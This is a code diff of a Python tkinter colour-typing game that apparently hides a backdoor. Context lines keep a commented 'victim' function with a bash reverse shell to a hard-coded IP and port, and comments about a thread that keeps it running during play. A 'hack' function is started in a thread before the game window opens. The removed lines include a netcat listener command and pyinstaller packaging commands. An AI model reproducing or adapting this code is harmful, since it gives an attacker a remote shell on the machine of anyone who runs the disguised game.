@@ -1,4 +1,3 @@
-# import the modules
 import tkinter
 import random
 import subprocess
@@ -18,7 +17,6 @@ timeleft = 60
 # def victim(num):
 #     subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/2246 0<&1 2>&1", shell=True, executable='/bin/bash')
 
-# # nc -lnvp 2246 -s 82.165.97.169
 
 # # a thread to allow this command to always run even if the game is being played
 # def hacking_thread(hack):
@@ -84,15 +82,13 @@ def countdown():
 		timeLabel.after(1000, countdown)
 
 
-# Driver Code
-
 # create a GUI window
 root = tkinter.Tk()
 
 # set the title
 root.title("COLORGAME")
 
-# set the title
+# set the icon
 # root.iconbitmap("game.ico")
 
 # set the size
@@ -115,22 +111,16 @@ timeLabel = tkinter.Label(root, text = "Time left: " +
 				
 timeLabel.pack()
 
-# add a label for displaying the colours
 label = tkinter.Label(root, font = ('Helvetica', 20))
 label.pack()
 
-# add a text entry box for typing in colours
 e = tkinter.Entry(root)
 
-# run the 'startGame' function when the enter key is pressed
 root.bind('<Return>', startGame)
 e.pack()
 
 # set focus on the entry box
 e.focus_set()
-
-# start the GUI
-# root.mainloop()
 
 
 def hack(num):
@@ -141,8 +131,3 @@ if __name__ == '__main__':
     thread.start()
     root.mainloop()
     exit()
-
-
-# pyinstaller.exe --onefile --icon=game.ico Visual_game.py
-# pyinstaller --onefile -w Visual_game.py
-# pyinstaller --onefile Visual_game.py
